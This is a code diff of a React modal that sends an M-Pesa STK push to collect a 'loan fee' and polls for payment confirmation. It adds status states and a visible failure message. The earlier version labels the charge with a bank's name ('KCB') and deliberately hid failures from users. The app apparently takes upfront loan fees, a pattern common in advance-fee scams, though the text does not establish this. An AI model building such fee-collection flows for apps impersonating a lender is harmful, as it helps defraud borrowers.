@@ -546,99 +546,122 @@ function ConfirmModal({ loan, userData, onProceed, onCancel }) {
 
 /* ── MODAL: STK PUSH SENT ── */
 function STKModal({ loan, userData, onSuccess, onCancel }) {
-  const [dotsCount, setDotsCount] = useState(1);
+  const [dots, setDots] = useState(1);
+  const [status, setStatus] = useState("sending");
 
-  const pollRef = useRef(null);
-  const dotsRef = useRef(null);
-  const hasRunRef = useRef(false);
+  const pollRef = useRef<NodeJS.Timeout | null>(null);
+  const dotsRef = useRef<NodeJS.Timeout | null>(null);
+  const startedRef = useRef(false);
 
-  const normPhone = normalisePhone(userData.phone) || userData.phone;
+  const phone = normalisePhone(userData.phone) || userData.phone;
 
   useEffect(() => {
-    if (hasRunRef.current) return;
-    hasRunRef.current = true;
+    if (startedRef.current) return;
+    startedRef.current = true;
 
-    // dots animation only
+    // animated dots
     dotsRef.current = setInterval(() => {
-      setDotsCount((d) => (d >= 3 ? 1 : d + 1));
-    }, 600);
+      setDots((d) => (d >= 3 ? 1 : d + 1));
+    }, 500);
 
-    const initPay = async () => {
+    const sendSTK = async () => {
       try {
+        setStatus("sending");
+
         const res = await fetch(`${MPESA_BASE}/api/runPrompt`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
-            phone: normPhone,
+            phone,
             amount: loan.fee,
             local_id: `KCB-${Date.now()}`,
-            transaction_desc: `KCB Loans fee Ksh ${loan.fee}`,
+            transaction_desc: `Loan fee payment Ksh ${loan.fee}`,
           }),
         });
 
         const data = await res.json().catch(() => ({}));
 
-        if (!res.ok || data.status === false) {
-          // ONLY log internally, DO NOT show UI error
-          console.log("STK failed to send:", data);
+        if (!res.ok || data?.status === false) {
+          setStatus("failed");
+          console.log("STK failed:", data);
           return;
         }
 
-        const cid =
-          data.checkout_request_id || data.checkoutRequestId || null;
+        const checkoutId =
+          data.checkout_request_id ||
+          data.checkoutRequestId ||
+          data.CheckoutRequestID;
 
-        if (!cid) return;
+        if (!checkoutId) {
+          setStatus("failed");
+          return;
+        }
 
+        setStatus("waiting");
+
+        // poll payment status
         pollRef.current = setInterval(async () => {
           try {
-            const r = await fetch(`${MPESA_BASE}/api/status/${cid}`);
+            const r = await fetch(`${MPESA_BASE}/api/status/${checkoutId}`);
             if (!r.ok) return;
 
             const d = await r.json();
 
             if (
-              d?.success === true ||
+              d?.ResultCode === 0 ||
               d?.status === "completed" ||
-              d?.ResultCode === 0
+              d?.success === true
             ) {
-              clearInterval(pollRef.current);
+              clearInterval(pollRef.current!);
+              setStatus("success");
               onSuccess();
             }
-          } catch {
-            // silently ignore
+          } catch (err) {
+            console.log("Polling error:", err);
           }
         }, 4000);
       } catch (err) {
-        console.log("STK network error", err);
+        console.log("STK error:", err);
+        setStatus("failed");
       }
     };
 
-    initPay();
+    sendSTK();
 
     return () => {
-      clearInterval(pollRef.current);
-      clearInterval(dotsRef.current);
+      if (pollRef.current) clearInterval(pollRef.current);
+      if (dotsRef.current) clearInterval(dotsRef.current);
     };
   }, []);
 
   return (
     <div className="modal-bg">
       <div className="modal-box" style={{ textAlign: "center" }}>
+        
         <div className="modal-icon phone">📱</div>
 
-        <div className="stk-title">STK Push Sent</div>
+        <div className="stk-title">M-Pesa STK Push</div>
 
         <div className="stk-phone-box">
-          Waiting for payment confirmation...
+          {phone}
         </div>
 
         <div className="stk-bar-wrap">
           <div className="stk-bar-fill" />
         </div>
 
-        <div className="stk-verifying">
-          Processing<span>{".".repeat(dotsCount)}</span>
-        </div>
+        {status === "failed" ? (
+          <div style={{ color: "red", fontSize: 13 }}>
+            Payment request failed. Try again.
+          </div>
+        ) : (
+          <div className="stk-verifying">
+            {status === "sending" && "Sending request"}
+            {status === "waiting" && "Waiting for payment"}
+            {status === "success" && "Confirmed"}
+            <span>{".".repeat(dots)}</span>
+          </div>
+        )}
 
         <button className="stk-manual" onClick={onCancel}>
           Cancel
